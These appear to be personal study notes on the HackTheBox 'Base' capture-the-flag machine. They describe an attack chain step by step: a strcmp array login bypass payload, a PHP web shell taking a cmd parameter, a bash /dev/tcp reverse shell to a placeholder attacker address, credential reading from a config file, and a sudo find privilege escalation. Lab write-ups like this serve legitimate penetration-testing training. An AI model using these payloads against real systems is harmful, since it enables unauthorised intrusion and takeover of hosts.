PHP is one of the most popular back-end languages in the world. It's flexible, cross-platform compatible,
cost-efficient and easy to learn. Services like Facebook, Wikipedia, Tumblr, HackTheBox, and Yahoo are built
with PHP, not to mention Wordpress and other content management systems. However, PHP can often bqe
misconfigured, which leaves huge vulnerability holes in the system, which cyber criminals could exploit.
Ethical Hackers & Penetration testers need to know how PHP works, along with the many varieties of
misconfiguration that they can discover. The Base machine teaches us how useful it is to analyze code &
how one slight mistake can lead to a fatal vulnerability.


enum es el script para hacer nmap, whichsys, OS-type


Change the POST data as follows to bypass the login.
This converts the variables to arrays and after forwarding the request, strcmp() returns true and the
login is successful. Once logged in, we see a file upload functionality.
username[]=admin&password[]=pass


Foothold
Since the webpage can execute PHP code, we can try uploading a PHP file to check if PHP file uploads are
allowed or not, and also check for PHP code execution.
Let us create a PHP file with the phpinfo() function, which outputs the configurational information of the
PHP installation.

echo "<?php phpinfo(); ?>" > test.php

After test.php has been created, choose the file after clicking the Upload button, and we will be
presented with the following notification, which shows that the file was successfully uploaded.

#we search for the folder uploads
gobuster dir --url http://10.10.10.48/ --wordlist /usr/share/wordlists/dirb/big.txt

Upon clicking on test.php , we can see the output of the phpinfo() command, thus confirming code
execution.
Let us now create a PHP web shell which uses the system() function and a cmd URL parameter to execute
system commands.
Place the following code into a file called webshell.php .

<?php echo system($_REQUEST['cmd']);?>



![Screenshot 2024-03-21 at 00.26.19.png](:/5e785a1676694fc8ab83e029834f808b)


In the repeater tab, we can alter the request and set the following reverse shell payload as a value for the
cmd parameter.

/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'

This reverse shell payload will make the remote host connect back to us with an interactive bash shell on
the specified port that we are listening on.

/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'



![Screenshot 2024-03-21 at 00.27.38.png](:/3c22a99c32364ef0ad1173859011c74c)
In order to execute our payload, we will have to first URL encode it. For URL encoding the payload, select
the payload text in the request body and press CTRL+U .


found the password in cat /var/www/html/login/config.php


According to GTFOBins , we need to run the following command in order to escalate our privileges:
GTFOBins is a curated list of Unix binaries that can be used to bypass local security
restrictions in misconfigured systems.

sudo find . -exec /bin/sh \; -quit












[Base.pdf](:/bab66257449b4e70b01d8ba5a1015240)